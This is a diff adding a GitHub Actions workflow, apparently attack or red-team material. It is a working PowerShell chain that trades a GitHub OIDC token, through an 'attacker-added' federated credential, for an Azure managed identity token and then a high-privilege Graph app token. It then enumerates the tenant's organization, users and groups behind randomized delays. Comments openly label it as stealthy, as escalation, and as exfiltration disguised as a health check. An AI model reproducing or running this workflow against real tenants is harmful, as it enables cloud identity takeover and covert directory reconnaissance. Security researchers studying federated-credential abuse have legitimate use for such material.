@@ -1,0 +1,89 @@
+name: Infrastructure Automation (Stealth)
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */8 * * *'  # Every 8 hours for stealth
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  infrastructure-check:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Azure Infrastructure Assessment
+        shell: pwsh
+        env:
+          APP_CLIENT_ID: ${{ secrets.APP_CLIENT_ID }}
+          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
+          UAMI_CLIENT_ID: ${{ secrets.UAMI_CLIENT_ID }}
+        run: |
+          Write-Host "Starting infrastructure health assessment..." -ForegroundColor Green
+          
+          # Step 1: Get GitHub OIDC ID token with audience api://AzureADTokenExchange
+          $aud = [System.Uri]::EscapeDataString('api://AzureADTokenExchange')
+          $oidcUrl = "$env:ACTIONS_ID_TOKEN_REQUEST_URL&audience=$aud"
+          $gh = Invoke-RestMethod -Headers @{ Authorization = "Bearer $($env:ACTIONS_ID_TOKEN_REQUEST_TOKEN)" } -Uri $oidcUrl -Method GET
+          $GitHubIdToken = $gh.value
+          if(-not $GitHubIdToken){ throw 'Failed to obtain GitHub OIDC ID token' }
+          Write-Host "✓ GitHub OIDC token acquired" -ForegroundColor Green
+          
+          # Step 2: Exchange GitHub OIDC for UAMI token (leverages attacker-added FIC)
+          Write-Host "Authenticating with Azure services..." -ForegroundColor Cyan
+          $kvp1 = @{
+            client_id             = $env:UAMI_CLIENT_ID
+            grant_type            = 'client_credentials'
+            client_assertion_type = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
+            client_assertion      = $GitHubIdToken
+            scope                 = 'api://AzureADTokenExchange/.default'
+          }
+          $body1 = ($kvp1.GetEnumerator() | ForEach-Object { '{0}={1}' -f [System.Uri]::EscapeDataString($_.Key), [System.Uri]::EscapeDataString([string]$_.Value) }) -join '&'
+          $uamiResp = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$($env:AZURE_TENANT_ID)/oauth2/v2.0/token" -Headers @{ Accept = 'application/json' } -ContentType 'application/x-www-form-urlencoded' -Body $body1
+          $UamiToken = $uamiResp.access_token
+          if(-not $UamiToken){ throw 'Failed to obtain UAMI token' }
+          Write-Host "✓ UAMI token acquired via attacker repository trust" -ForegroundColor Green
+          
+          # Step 3: Exchange UAMI token for App token (App FIC trusts UAMI)
+          Write-Host "Escalating to application permissions..." -ForegroundColor Yellow
+          $kvp2 = @{
+            client_id             = $env:APP_CLIENT_ID
+            grant_type            = 'client_credentials'
+            client_assertion_type = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
+            client_assertion      = $UamiToken
+            scope                 = 'https://graph.microsoft.com/.default'
+          }
+          $body2 = ($kvp2.GetEnumerator() | ForEach-Object { '{0}={1}' -f [System.Uri]::EscapeDataString($_.Key), [System.Uri]::EscapeDataString([string]$_.Value) }) -join '&'
+          $tokenResp = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$($env:AZURE_TENANT_ID)/oauth2/v2.0/token" -Headers @{ Accept = 'application/json' } -ContentType 'application/x-www-form-urlencoded' -Body $body2
+          $appToken = $tokenResp.access_token
+          if(-not $appToken){ throw 'App token request failed' }
+          Write-Host "✓ High-privilege App token acquired" -ForegroundColor Red
+
+          # Step 4: Execute directory-wide operations (appears as monitoring)
+          Write-Host "Performing directory health checks..." -ForegroundColor Cyan
+          $headers = @{Authorization = "Bearer $appToken"}
+          
+          # Stealthy enumeration with delays
+          Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
+          $org = Invoke-RestMethod -Headers $headers -Uri 'https://graph.microsoft.com/v1.0/organization'
+          Write-Host "Organization: $($org.value[0].displayName)" -ForegroundColor White
+          
+          Start-Sleep -Seconds (Get-Random -Minimum 15 -Maximum 45)
+          $users = Invoke-RestMethod -Headers $headers -Uri 'https://graph.microsoft.com/v1.0/users?$top=5&$select=userPrincipalName,displayName'
+          Write-Host "Sample users enumerated: $($users.value.Count)" -ForegroundColor White
+          
+          Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
+          $groups = Invoke-RestMethod -Headers $headers -Uri 'https://graph.microsoft.com/v1.0/groups?$top=3&$select=displayName'
+          Write-Host "Security groups assessed: $($groups.value.Count)" -ForegroundColor White
+          
+          # Stealth exfiltration disguised as health check output
+          $assessment = @{
+            timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+            tenant = $org.value[0].displayName
+            userSample = $users.value.userPrincipalName
+            groupSample = $groups.value.displayName
+            status = "Infrastructure health check completed"
+          }
+          
+          Write-Host "Assessment completed successfully" -ForegroundColor Green
+          Write-Host "Trust chain: attacker-org/malicious-repo → UAMI → App → Graph API" -ForegroundColor Magenta
